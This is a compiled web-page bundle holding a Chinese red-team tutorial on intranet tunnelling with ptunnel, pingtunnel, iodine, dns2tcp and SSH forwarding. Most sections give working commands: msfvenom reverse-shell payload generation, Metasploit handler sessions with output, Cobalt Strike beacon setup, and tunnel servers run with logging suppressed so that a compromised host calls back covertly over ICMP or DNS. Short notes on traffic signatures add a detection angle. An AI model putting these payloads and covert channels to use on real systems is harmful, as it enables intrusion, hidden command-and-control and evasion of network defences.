import{_ as a}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as p,b as n,a as s,d as i,e as o,r,o as l}from"./app-vU8izl1I.js";const c="/DailyNotes/assets/image-20231204182250798-CB4XRVHC.png",d="/DailyNotes/assets/image-20231204180659967-kCQ1aK3I.png",g="/DailyNotes/assets/image-20231204180954893-LLVPfn4Q.png",m="/DailyNotes/assets/image-20231204181423774-thiCgNJk.png",h="/DailyNotes/assets/image-20231205131213945-CSvo90X1.png",f="/DailyNotes/assets/image-20231205131228617-HDREQzxP.png",u="/DailyNotes/assets/image-20231204182013245-zfJpC7k1.png",_="/DailyNotes/assets/image-20231205131401807-BreLkW4F.png",b="/DailyNotes/assets/image-20231205140005738-DtURI-8X.png",y="/DailyNotes/assets/image-20231205140103703-CUBMGSl1.png",x="/DailyNotes/assets/image-20240109223556139-DX0vMGAz.png",v="/DailyNotes/assets/image-20240109223629232-Cd6GhezH.png",P="/DailyNotes/assets/image-20240109224512073-nWUfAh-i.png",k="/DailyNotes/assets/image-20240109224633925-CILHsx18.png",C="/DailyNotes/assets/image-20240115153402449-lPWfw1bU.png",H="/DailyNotes/assets/image-20240116152131909-CPFFdX0h.png",N="/DailyNotes/assets/image-20240116153846286-C5sAQtKs.png",D="/DailyNotes/assets/image-20240109230229832-BiGjZchQ.png",I="/DailyNotes/assets/image-20240109230426359-BVwIK2eH.png",S="/DailyNotes/assets/dnspod-Ck-U3AS7.png",z="/DailyNotes/assets/port-DVh5ZmJb.png",T="/DailyNotes/assets/server-CMlAnhkx.png",A="/DailyNotes/assets/ifconfig_server-D5ITtUI7.png",B="/DailyNotes/assets/client-BaveSQ1V.png",M="/DailyNotes/assets/ifconfig_client-tEnpQ3I9.png",w="/DailyNotes/assets/pingserver--sPUaJOF.png",L="/DailyNotes/assets/ssh-CNCR-Ny8.png",V="/DailyNotes/assets/ssh2-JG_HINHr.png",O="/DailyNotes/assets/dns2tcp1-zpgI3nb_.png",R="/DailyNotes/assets/dns2tcp2-K3GovVUj.png",q="/DailyNotes/assets/dns2tcp3-BE5EEC92.png",E="/DailyNotes/assets/dns2tcp4-BEyOOPZL.png",G="/DailyNotes/assets/dns2tcp5-CwRoc29D.png",U="/DailyNotes/assets/dns2tcp6-nZ8o221h.png",W={},Q={href:"https://salsa.debian.org/alteholz/ptunnel",target:"_blank",rel:"noopener noreferrer"};function Z(J,e){const t=r("ExternalLinkIcon");return l(),p("div",null,[e[1]||(e[1]=n('<h1 id="内网隧道工具使用" tabindex="-1"><a class="header-anchor" href="#内网隧道工具使用"><span>内网隧道工具使用</span></a></h1><p>记录几种常用内网隧道工具的使用，按隧道类型分类，例如 ICMP、DNS 隧道等。</p><h2 id="_1-icmp-隧道" tabindex="-1"><a class="header-anchor" href="#_1-icmp-隧道"><span>1. ICMP 隧道</span></a></h2><h3 id="_1-1-ptunnel" tabindex="-1"><a class="header-anchor" href="#_1-1-ptunnel"><span>1.1 ptunnel</span></a></h3>',4)),s("blockquote",null,[s("p",null,[s("a",Q,[e[0]||(e[0]=i("Thorsten Alteholz / ptunnel · GitLab (debian.org)",-1)),o(t)])])]),e[2]||(e[2]=n(`<p>主要参数（ptunnel -h 可以查看详细信息）</p><pre><code>-x ：指定ICMP隧道连接的验证密码
-lp：指定要监听的本地TCP端口
-da：指定要转发的目标机器的IP地址
-dp：指定要转发的目标机器的TCP端口
-p：指定ICMP隧道连一段的IP地址
</code></pre><h4 id="上线-msf" tabindex="-1"><a class="header-anchor" href="#上线-msf"><span>上线 msf</span></a></h4><p>攻击机：开启 ptunnel 的 server，将 client 端发过来的 icmp 流量解析成 tcp 的</p><p>靶机：开启 ptunnel 的 client，监听本地的 9999 端口，ptunnel 的 client 将 9999 端口接到的流量封装成 icmp，发送到 server 端。</p><p><strong>1）攻击机操作：</strong></p><p>新生成 msf 马，然后放在靶机上</p><pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9999 -f elf -o exp
</code></pre><p>攻击机开启 msf 监听，此处监听的 4444 端口，后面会用到</p><figure><img src="`+c+`" alt="image-20231204182250798" tabindex="0" loading="lazy"><figcaption>image-20231204182250798</figcaption></figure><p>攻击机开启 ptunnel 的 server kali 自带的，所以直接执行就可以</p><pre><code>ptunnel
</code></pre><figure><img src="`+d+`" alt="image-20231204180659967" tabindex="0" loading="lazy"><figcaption>image-20231204180659967</figcaption></figure><p><strong>2）靶机操作：</strong></p><p>靶机端执行 client</p><pre><code>./ptunnel -p 100.1.1.169 -lp 9999 -da 100.1.1.169 -dp 4444

# -p   server端的IP
# -lp  本地监听的端口（只要是这个端口接到的tcp流量，全部封装成icmp,发送到server端）
# -da -dp 告诉server端，解析后的流量转发到哪个ip和端口，这里填的是msf监听的IP和端口
</code></pre><p>运行可能报错</p><p><img src="`+g+`" alt="image-20231204180954893" loading="lazy">解决办法：</p><pre><code>sudo yum install libpcap-devel
# 安装完可能版本不对
cd /usr/lib64/
ln -s libpcap.so.1.5.3 libpcap.so.0.8
</code></pre><figure><img src="`+m+'" alt="image-20231204181423774" tabindex="0" loading="lazy"><figcaption>image-20231204181423774</figcaption></figure><p>靶机正常执行后效果如下：</p><figure><img src="'+h+'" alt="image-20231205131213945" tabindex="0" loading="lazy"><figcaption>image-20231205131213945</figcaption></figure><p>然后靶机执行 msf 马，server 端会收到消息，从 192.168.1.189 接到了 icmp 流量，解析出来后发现需要转发到 100.1.1.169 的 4444 端口</p><figure><img src="'+f+'" alt="image-20231205131228617" tabindex="0" loading="lazy"><figcaption>image-20231205131228617</figcaption></figure><p>上线成功</p><figure><img src="'+u+'" alt="image-20231204182013245" tabindex="0" loading="lazy"><figcaption>image-20231204182013245</figcaption></figure><figure><img src="'+_+'" alt="image-20231205131401807" tabindex="0" loading="lazy"><figcaption>image-20231205131401807</figcaption></figure><p>上面的 session 看起来是攻击机的 IP，其实 ptunnel 的 server 端转发过来的，只是 ptunnel 的 server 和 msf 放在同一个攻击机上而已。</p><h4 id="流量特征" tabindex="-1"><a class="header-anchor" href="#流量特征"><span>流量特征</span></a></h4><p>先发送 1 个长度为 70 的 request，然后又 2 个长度 70 的 reply(内容固定)，接着就一直发送长度为 1096 的 reply 包，每秒为一个周期（可以对比下面两图的时间差）,流量包： <a href="img%5CTunnel%5Cptunnel_2.pcap">ptunnel_2.pcap</a> <a href="img%5CTunnel%5Cptunnel_1.pcap">ptunnel_1.pcap</a></p><figure><img src="'+b+'" alt="image-20231205140005738" tabindex="0" loading="lazy"><figcaption>image-20231205140005738</figcaption></figure><figure><img src="'+y+`" alt="image-20231205140103703" tabindex="0" loading="lazy"><figcaption>image-20231205140103703</figcaption></figure><h3 id="_1-2-pingtunnel" tabindex="-1"><a class="header-anchor" href="#_1-2-pingtunnel"><span>1.2 pingtunnel</span></a></h3><blockquote><p>下面以服务端为 server，client 端为 windows 为例（反过来无法上线，不知道为啥）</p></blockquote><h4 id="基础转发-tcp-流量" tabindex="-1"><a class="header-anchor" href="#基础转发-tcp-流量"><span>基础转发 tcp 流量</span></a></h4><p>简单的通过 icmp 隧道转发 tcp 流量，攻击机 kali-192.168.73.98</p><pre><code>./pingtunnel -type server -key 123456
</code></pre><figure><img src="`+x+`" alt="image-20240109223556139" tabindex="0" loading="lazy"><figcaption>image-20240109223556139</figcaption></figure><p>靶机 Win-192.168.1.8</p><pre><code>./pingtunnel.exe -type client -l :8888 -s 192.168.73.98 -t 192.168.73.98:7777 -tcp 1 -key 123456
</code></pre><figure><img src="`+v+'" alt="image-20240109223629232" tabindex="0" loading="lazy"><figcaption>image-20240109223629232</figcaption></figure><p>这样通道就建立起来，192.168.1.8 的 8888 端口收到的 tcp 流量，都会被转为 icmp 流量发给 server，然后在 server 端解析成 tcp（解析到 7777 端口）</p><p>假如这样把 tcp 流量发给 192.168.1.8 的 8888</p><figure><img src="'+P+'" alt="image-20240109224512073" tabindex="0" loading="lazy"><figcaption>image-20240109224512073</figcaption></figure><p>server 端可以收到并解析出来</p><figure><img src="'+k+`" alt="image-20240109224633925" tabindex="0" loading="lazy"><figcaption>image-20240109224633925</figcaption></figure><h4 id="转发-tcp-上线-msf" tabindex="-1"><a class="header-anchor" href="#转发-tcp-上线-msf"><span>转发 TCP 上线 msf</span></a></h4><ul><li>准备好一个具有公网 IP 的服务器，root 权限运行以下命令，启动 ICMP 隧道服务端</li></ul><pre><code>./pingtunnel -type server -noprint 1 -nolog 1
</code></pre><ul><li>ICMP 隧道客户端（即需要通过 ICMP 隧道上线的主机）执行以下命令即可成功创建反向 ICMP 隧道</li></ul><pre><code class="language-shell">pingtunnel.exe <span class="token parameter variable">-type</span> client <span class="token parameter variable">-l</span> <span class="token number">127.0</span>.0.1:9999 <span class="token parameter variable">-s</span> icmpserver_ip <span class="token parameter variable">-t</span> c2_server_ip:7777 <span class="token parameter variable">-tcp</span> <span class="token number">1</span> <span class="token parameter variable">-noprint</span> <span class="token number">1</span> <span class="token parameter variable">-nolog</span> <span class="token number">1</span>
<span class="token comment"># 该命令的意思是icmp客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777</span>
<span class="token comment"># icmpserver_ip 192.168.1.10</span>
<span class="token comment"># c2_server_ip 192.168.1.10</span>
</code></pre><p>生成反向 payload 的 meterpreter 并上传到 ICMP 隧道客户端执行即可上线</p><pre><code class="language-shell">msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">9999</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> meterpreter.exe
<span class="token comment"># 这里的lhost和lport为icmp客户端监听ip和端口</span>
</code></pre><p>启动 msf 监听，等待 meterpreter 执行上线</p><pre><code># 这里的lhost和lport为icmp客户端转发到的ip和端口

msf6 &gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0
lhost =&gt; 0.0.0.0
msf6 exploit(multi/handler) &gt; set lport 7777
lport =&gt; 7777
msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 0.0.0.0:7777
[*] Sending stage (200774 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened (192.168.1.10:7777 -&gt; 192.168.1.10:44832) at 2024-01-15 02:26:28 -0500

meterpreter &gt; getuid
Server username: ECHO0D-WIN\\echo0d

</code></pre><figure><img src="`+C+`" alt="image-20240115153402449" tabindex="0" loading="lazy"><figcaption>image-20240115153402449</figcaption></figure><h4 id="转发-tcp-上线-cs" tabindex="-1"><a class="header-anchor" href="#转发-tcp-上线-cs"><span>转发 TCP 上线 cs</span></a></h4><ul><li>准备好一个具有公网 IP 的服务器，root 权限运行以下命令，启动 ICMP 隧道服务端</li></ul><pre><code>./pingtunnel -type server -noprint 1 -nolog 1
</code></pre><p>ICMP 隧道客户端（即需要通过 ICMP 隧道上线的主机）执行以下命令即可成功创建反向 ICMP 隧道</p><pre><code>pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1

# 该命令的意思是icmp隧道客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777
</code></pre><ul><li><p>cobaltstrike 创建 listener https host 和 https port(c2)为 ICMP 隧道客户端的监听 IP 和端口 https port(bind)为转发目的地址的端口</p></li><li><p>生成反向 payload 的 beacon</p></li><li><p>上传生成的 beacon 到 ICMP 隧道客户端执行，成功通过反向 ICMP 隧道上线</p></li></ul><h4 id="转发-socks-上线-msf-失败" tabindex="-1"><a class="header-anchor" href="#转发-socks-上线-msf-失败"><span>转发 socks 上线 msf（失败）</span></a></h4><blockquote><p>按理说是这样的，但是流量里还是有 tcp</p></blockquote><ul><li>准备好一个具有公网 IP 的服务器，root 权限运行以下命令，启动 ICMP 隧道服务端</li></ul><pre><code class="language-shell">./pingtunnel <span class="token parameter variable">-type</span> server <span class="token parameter variable">-noprint</span> <span class="token number">1</span> <span class="token parameter variable">-nolog</span> <span class="token number">1</span>
</code></pre><p>ICMP 隧道客户端（即需要通过 ICMP 隧道上线的主机）执行以下命令即可成功创建反向 ICMP 隧道</p><pre><code class="language-shell">pingtunnel.exe <span class="token parameter variable">-type</span> client <span class="token parameter variable">-l</span> <span class="token number">127.0</span>.0.1:6688 <span class="token parameter variable">-s</span> icmpserver_ip <span class="token parameter variable">-sock5</span> <span class="token number">1</span> <span class="token parameter variable">-nolog</span> <span class="token number">1</span> <span class="token parameter variable">-noprint</span> <span class="token number">1</span>
<span class="token comment"># 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址</span>
<span class="token comment"># icmpserver_ip 192.168.1.10</span>
</code></pre><p>生成支持 socks5 代理的反向 payload 的 meterpreter 并上传到 ICMP 隧道客户端执行即可上线</p><pre><code class="language-shell">msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>c2_server_ip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">8443</span> <span class="token assign-left variable">HttpProxyType</span><span class="token operator">=</span>SOCKS <span class="token assign-left variable">HttpProxyHost</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1 <span class="token assign-left variable">HttpProxyPort</span><span class="token operator">=</span><span class="token number">6688</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> meterpreter.exe
<span class="token comment"># c2_server_ip 192.168.1.10</span>
</code></pre><p>启动 msf 监听，等待 meterpreter 执行上线</p><pre><code>msf6 &gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0
lhost =&gt; 0.0.0.0
msf6 exploit(multi/handler) &gt; set lport 6688
lport =&gt; 6688
msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 0.0.0.0:6688
[*] Sending stage (200774 bytes) to 192.168.1.11
[*] Meterpreter session 4 opened (192.168.1.10:6688 -&gt; 192.168.1.11:59957) at 2024-01-16 02:17:38 -0500

meterpreter &gt; getuid
Server username: ECHO0D-WIN\\echo0d
</code></pre><figure><img src="`+H+'" alt="image-20240116152131909" tabindex="0" loading="lazy"><figcaption>image-20240116152131909</figcaption></figure><p>此处不确定是否成功，因为夹杂了 TCP</p><figure><img src="'+N+'" alt="image-20240116153846286" tabindex="0" loading="lazy"><figcaption>image-20240116153846286</figcaption></figure><h4 id="流量特征-1" tabindex="-1"><a class="header-anchor" href="#流量特征-1"><span>流量特征</span></a></h4><p>icmp 包长度突然变化，就是有 tcp 流量要发</p><figure><img src="'+D+'" alt="image-20240109230229832" tabindex="0" loading="lazy"><figcaption>image-20240109230229832</figcaption></figure><p>以及突然流量包数量变多</p><figure><img src="'+I+'" alt="image-20240109230426359" tabindex="0" loading="lazy"><figcaption>image-20240109230426359</figcaption></figure><h2 id="_2-dns-隧道" tabindex="-1"><a class="header-anchor" href="#_2-dns-隧道"><span>2. DNS 隧道</span></a></h2><h3 id="_2-1-iodine" tabindex="-1"><a class="header-anchor" href="#_2-1-iodine"><span>2.1 iodine</span></a></h3><blockquote><p>以下的服务器和域名均来自腾讯云</p><p>服务器：https://cloud.tencent.com/product/cvm?from=10680</p><p>域名解析：https://cloud.tencent.com/product/cns?from=10680</p></blockquote><p>iodine 是基于 C 语言开发的，分为服务端和客户端。iodine 支持转发模式和中继模式。其原理是：通过 TAP 虚拟网卡，在服务端建立一个局域网，在客户端也通过 TAP 建立一个虚拟网卡，两者通过 DNS 隧道连接，处于同一个局域网(可以通过 ping 命令通信)。在客户端和服务器之间建立连接后，客户机上会多出一块名为 dns0 的虚拟网卡。</p><p>与同类工具相比，iodine 具有如下特点：</p><blockquote><p>参考https://cloud.tencent.com/developer/article/1937092</p></blockquote><ul><li>不会对下行数据进行编码</li><li>支持多平台(Linux、Windows、MacOS)</li><li>支持 16 个并发连接</li><li>支持强密码机制</li><li>支持同网段隧道 IP 地质(不同于服务器一客户端网段)</li><li>支持多种 DNS 记录类型</li><li>提供了丰富的隧道质量检测措施</li></ul><h4 id="_1-部署域名解析" tabindex="-1"><a class="header-anchor" href="#_1-部署域名解析"><span>1. 部署域名解析</span></a></h4><blockquote><p>https://console.dnspod.cn/</p></blockquote><p>首先，用一台公网的 Linux 系统的 VPS 作为 C&amp;C 服务器，并准备好一个可以配置的域名(这里我们假设是<code>dnslog1.site</code>)。然后配置域名的记录，如下：</p><figure><img src="'+S+`" alt="dnspod" tabindex="0" loading="lazy"><figcaption>dnspod</figcaption></figure><p>创建记录 A，将自己的域名<code>dns.dnslog1.site</code>解析到 VPS 服务器地址。然后创建 NS 记录，将 <code>dns2tcp.dnslog1.site </code>指向 <code>dns.dnslog1.site </code>。</p><ul><li>第一条 A 类解析是在告诉域名系统，<code>dns.dnslog1.site</code>的 IP 地址是 <code>xx.xx.xx.xx</code> 。</li><li>第二条 NS 解析是在告诉域名系统，想要知道<code>dns2tcp.dnslog1.site</code>的 IP 地址，就去问<code>dns.dnslog1.site</code> 。</li></ul><p><strong>验证域名解析设置是否成功</strong></p><p>在随便一台电脑上 ping 域名<code>dns.dnslog1.site</code>，若能 ping 通，且显示的 IP 地址是我们配置的 VPS 的地址，说明第一条 A 类解析设置成功并已生效。</p><p>然后在我们的 VPS 上执行以下命令监听 UDP 53 端口</p><pre><code class="language-javascript">tcpdump <span class="token operator">-</span>n <span class="token operator">-</span>i eth0 udp dst port <span class="token number">53</span>
</code></pre><p>在任意一台机器上执行 <code>nslookup dns2tcp.dnslog1.site </code>命令，如果在我们的 VPS 监听的端口有查询信息，说明第二条记录设置成功。</p><h4 id="_2-安装并启动服务端" tabindex="-1"><a class="header-anchor" href="#_2-安装并启动服务端"><span>2. 安装并启动服务端</span></a></h4><p>提前检查 VPS 服务器防火墙的 53 端口是否打开：</p><figure><img src="`+z+`" alt="port" tabindex="0" loading="lazy"><figcaption>port</figcaption></figure><p>这里用的服务端是 Centos7 系统，可以执行安装命令：</p><pre><code>yum -y install iodine
</code></pre><p>如果是 Windows 系统，可以安装编译好的对应版本的 iodine。</p><p>执行以下命令启动服务端：</p><pre><code>iodined -f -c -P root@123456 172.16.10.1 dns2tcp.dnslog1.site -DD
    -f：在前台运行
    -c：禁止检查所有传入请求的客户端IP地址
    -P：指定密码
    -D：指定调试级别。-DD指第二级，D的数量随等级增加
    这里的172.16.10.1是自定义的局域网虚拟IP地址
</code></pre><figure><img src="`+T+'" alt="server" tabindex="0" loading="lazy"><figcaption>server</figcaption></figure><p>服务端启动成功后，VPS 上多了一块 dns0 的网卡，ip 为我们设置的 172.16.10.1</p><figure><img src="'+A+`" alt="ifconfig_server" tabindex="0" loading="lazy"><figcaption>ifconfig_server</figcaption></figure><h4 id="_3-安装并启动客户端" tabindex="-1"><a class="header-anchor" href="#_3-安装并启动客户端"><span>3. 安装并启动客户端</span></a></h4><p><strong>Windows 系统</strong></p><p>如果是 Windows 系统，直接执行下面命令启动客户端，但是启动的过程中，会遇到杀毒软件的报毒，并且需要管理员权限执行命令才可以启动。</p><pre><code>iodine.exe -f -P root@123456 dns2tcp.dnslog1.site
</code></pre><p><strong>Linux 系统</strong></p><p>如果是 Linux 系统，先安装 iodine。上传 iodlie 客户端到目标主机，解压，进入目录安装</p><pre><code>cd iodine-0.7.0/
make &amp;&amp; make install
</code></pre><p>kali 默认安装了 iodine，执行下面命令连接服务端(需要 root 权限)，如图连接成功。</p><pre><code>iodine -f -P root@123456 dns2tcp.dnslog1.site
</code></pre><figure><img src="`+B+'" alt="client" tabindex="0" loading="lazy"><figcaption>client</figcaption></figure><p>连接成功后，客户端上新建了一个 dns0 的网卡，IP 地址为 172.16.10.2</p><figure><img src="'+M+'" alt="ifconfig_client" tabindex="0" loading="lazy"><figcaption>ifconfig_client</figcaption></figure><p>然后 ping 服务端地址</p><figure><img src="'+w+'" alt="pingserver" tabindex="0" loading="lazy"><figcaption>pingserver</figcaption></figure><h4 id="_4-使用-dns-隧道" tabindex="-1"><a class="header-anchor" href="#_4-使用-dns-隧道"><span>4. 使用 DNS 隧道</span></a></h4><p>客户端和服务端连接成功后，由于客户端和服务端处在一个逻辑的局域网中，所以可以直接通。</p><p><strong>服务端 SSH 连接客户端</strong></p><figure><img src="'+L+'" alt="ssh" tabindex="0" loading="lazy"><figcaption>ssh</figcaption></figure><p><strong>客户端 SSH 连接服务端</strong></p><figure><img src="'+V+'" alt="ssh2" tabindex="0" loading="lazy"><figcaption>ssh2</figcaption></figure><hr><h3 id="_2-2-dns2tcp" tabindex="-1"><a class="header-anchor" href="#_2-2-dns2tcp"><span>2.2 dns2tcp</span></a></h3><p>dns2tcp 是一个利用 DNS 隧道转发 TCP 连接的工具，使用 C 语言开发。</p><h4 id="_1-部署域名解析-1" tabindex="-1"><a class="header-anchor" href="#_1-部署域名解析-1"><span>1. 部署域名解析</span></a></h4><figure><img src="'+O+`" alt="dns2tcp1" tabindex="0" loading="lazy"><figcaption>dns2tcp1</figcaption></figure><p><strong>验证域名解析设置是否成功</strong>，步骤同上。</p><h4 id="_2-安装并启动服务端-1" tabindex="-1"><a class="header-anchor" href="#_2-安装并启动服务端-1"><span>2. 安装并启动服务端</span></a></h4><p>工具下载地址：https://github.com/alex-sector/dns2tcp</p><p>提前检查 VPS 服务器防火墙的 53 端口是否打开，将下载的工具上传到 VPS，依次执行</p><pre><code>unzip dns2tcp-master.zip
cd dns2tcp-master
./configure
make
make install
</code></pre><p>准备配置文件（腾讯云服务器不给实际网卡分配公网 IP，所以要监听 0.0.0.0）：</p><pre><code>vim /etc/dns2tcpd.conf

listen = 0.0.0.0
port = 53
user = nobody
chroot = /var/empty/dns2tcp/
domain = a.dnslog1.site
resources = ssh:127.0.0.1:22,smtp:127.0.0.1:25,http:127.0.0.1:8080
</code></pre><p>完成后运行服务端：</p><pre><code>dns2tcpd  -F -d 1 -f /etc/dns2tcpd.conf
</code></pre><figure><img src="`+R+`" alt="dns2tcp2" tabindex="0" loading="lazy"><figcaption>dns2tcp2</figcaption></figure><h4 id="_3-安装并启动客户端-1" tabindex="-1"><a class="header-anchor" href="#_3-安装并启动客户端-1"><span>3. 安装并启动客户端</span></a></h4><p>kali 默认安装了 dns2tcp，测试连接：</p><pre><code>dns2tcpc -z a.dnslog1.site &lt;服务器IP&gt;
</code></pre><p>其中&lt;服务器 IP&gt;可选，服务端所在 IP（DNS 服务器 IP）。不写将使用中继模式，否则使用直连模式，如果提示：</p><pre><code>Available connection（s）:
        ssh
        smtp
        http
</code></pre><p>表示连接可用！</p><h4 id="_4-使用-dns-隧道-1" tabindex="-1"><a class="header-anchor" href="#_4-使用-dns-隧道-1"><span>4. 使用 DNS 隧道</span></a></h4><pre><code>dns2tcpc -l 4444 -r ssh  -z a.dnslog1.site &lt;服务器IP&gt; -c -d 3
</code></pre><p>-c 表示启用数据压缩；-d 表示启动调试，3 为调试等级；-l 表示监听本地端口，4444 为端口名；-r 为使用服务端上的哪个资源，ssh 为资源名；-z 后为前面配置的 NS 记录的域名。</p><figure><img src="`+q+`" alt="dns2tcp3" tabindex="0" loading="lazy"><figcaption>dns2tcp3</figcaption></figure><p>然后 ssh 连接本地 4444 端口就相当于连接服务端：</p><pre><code>ssh root@127.0.0.1 -p 4444
</code></pre><figure><img src="`+E+`" alt="dns2tcp4" tabindex="0" loading="lazy"><figcaption>dns2tcp4</figcaption></figure><hr><p><strong>若需要将内网 msf 流量转发到外网：</strong></p><p>参考：https://blog.csdn.net/redwand/article/details/112727816</p><p>通过 dns 隧道嵌套 ssh 隧道实现本地端口转发：</p><pre><code>ssh -CfNg -L 6666:&lt;服务器IP&gt;:6666 root@127.0.0.1 -p 4444
</code></pre><figure><img src="`+G+`" alt="dns2tcp5" tabindex="0" loading="lazy"><figcaption>dns2tcp5</figcaption></figure><p>生成木马，监听在客户端 192.168.13.188 的 6666 端口上</p><pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.13.188 LPORT=6666 -f elf &gt; shell.elf
</code></pre><p>服务器打开 msf，监听 6666 端口：</p><pre><code>msf6 &gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp
payload =&gt; linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0
lhost =&gt; 0.0.0.0
msf6 exploit(multi/handler) &gt; set lport 6666
lport =&gt; 6666
msf6 exploit(multi/handler) &gt; run
</code></pre><p>在内网的主机(这里选择另一台虚拟机 192.168.13.100)运行 shell.elf</p><pre><code>chmod 777 shell.elf
./shell.elf
</code></pre><p>成功得到上线 meterpreter shell：</p><figure><img src="`+U+`" alt="dns2tcp6" tabindex="0" loading="lazy"><figcaption>dns2tcp6</figcaption></figure><h2 id="_3-ssh-隧道" tabindex="-1"><a class="header-anchor" href="#_3-ssh-隧道"><span>3. SSH 隧道</span></a></h2><p><strong>本地转发：</strong></p><p>用法 1：本地端口映射到远程。HostB 上启动一个 PortB 端口，映射到 HostC:PortC 上，在 HostB 上运行</p><pre><code>HostB$ ssh -CNfg -L PortB:HostC:PortC user@HostC
</code></pre><p>这时访问 HostB:PortB 相当于访问 HostC:PortC（和 iptable 的 port-forwarding 类似）。</p><p>用法 2：本地端口通过跳板映射到其他机器。HostA 上启动一个 PortA 端口，通过 HostB 转发到 HostC:PortC 上，在 HostA 上运行：</p><pre><code>HostA$ ssh -CNfg -L PortA:HostC:PortC  user@HostB
</code></pre><p>这时访问 HostA:PortA 相当于访问 HostC:PortC。</p><p>两种用法的区别是，第一种用法本地到跳板机 HostB 的数据是明文的，而第二种用法一般本地就是 HostA，访问本地的 PortA，数据被 ssh 加密传输给 HostB 又转发给 HostC:PortC。</p><p>**远程转发：**让远端启动端口，把远端端口数据转发到本地。</p><p>HostA 将自己可以访问的 HostB:PortB 暴露给外网服务器 HostC:PortC，在 HostA 上运行：</p><pre><code>HostA$ ssh -CNfg -R HostC:PortC:HostB:PortB  user@HostC
#HostA的ssh服务端监听7777, 将收到的tcp数据包通过连接到HostB的ssh隧道，转发到HostC:PortC，效果是访问HostA本地的7777就相当于访问HostC:PortC
</code></pre><p>那么链接 HostC:PortC 就相当于链接 HostB:PortB。使用时需修改 HostC 的 /etc/ssh/sshd_config，添加：</p><pre><code>GatewayPorts yes
</code></pre><p>相当于-L 参数区别：比如 HostA 和 HostB 是同一个内网下的两台可以互相访问的机器，HostC 是外网跳板机，HostC 不能访问 HostA，但是 HostA 可以访问 HostC。那么通过在内网 HostA 上运行 <code>ssh -R</code> 告诉 HostC，创建 PortC 端口监听，把该端口所有数据转发给我（HostA），我会再转发给同一个内网下的 HostB:PortB。</p><p>同内网下的 HostA/HostB 也可以是同一台机器，换句话说就是内网 HostA 把自己可以访问的端口暴露给了外网 HostC。</p><p>**动态转发：**socks 代理</p><pre><code>ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1
# ssh客户端监听127.0.0.1:7777开启socks服务，将收到的socks数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到目标地址，也就是只要知道一个内网主机的密码，就可以用它上面的ssh服务转发流量了。
</code></pre><p>构建 ssh 隧道的常用参数:</p><pre><code>-C 压缩传输，提高传输速度
-f 后台执行数据传输
-N 建立静默连接
-g 允许远程主机连接本地用于转发的端口
-L 本地端口转发
-R 远程端口转发
-D 动态转发，即SOCKS代理
-p 指定ssh连接端口
</code></pre><h2 id="_4-tcp-over-http" tabindex="-1"><a class="header-anchor" href="#_4-tcp-over-http"><span>4. TCP over HTTP</span></a></h2><h3 id="_4-1-abptts" tabindex="-1"><a class="header-anchor" href="#_4-1-abptts"><span>4.1 ABPTTS</span></a></h3>`,193))])}const X=a(W,[["render",Z]]),j=JSON.parse('{"path":"/CyberSecurity/RedTeam/Tools/Tunnel.html","title":"内网隧道工具使用","lang":"zh-CN","frontmatter":{"category":"网络安全","tags":["隧道","工具"],"sticky":"1","star":"1","description":"内网隧道工具使用 记录几种常用内网隧道工具的使用，按隧道类型分类，例如 ICMP、DNS 隧道等。 1. ICMP 隧道 1.1 ptunnel Thorsten Alteholz / ptunnel · GitLab (debian.org) 主要参数（ptunnel -h 可以查看详细信息） 上线 msf 攻击机：开启 ptunnel 的 serv...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/Tools/Tunnel.html"}],["meta",{"property":"og:site_name","content":"echo0d-notes"}],["meta",{"property":"og:title","content":"内网隧道工具使用"}],["meta",{"property":"og:description","content":"内网隧道工具使用 记录几种常用内网隧道工具的使用，按隧道类型分类，例如 ICMP、DNS 隧道等。 1. ICMP 隧道 1.1 ptunnel Thorsten Alteholz / ptunnel · GitLab (debian.org) 主要参数（ptunnel -h 可以查看详细信息） 上线 msf 攻击机：开启 ptunnel 的 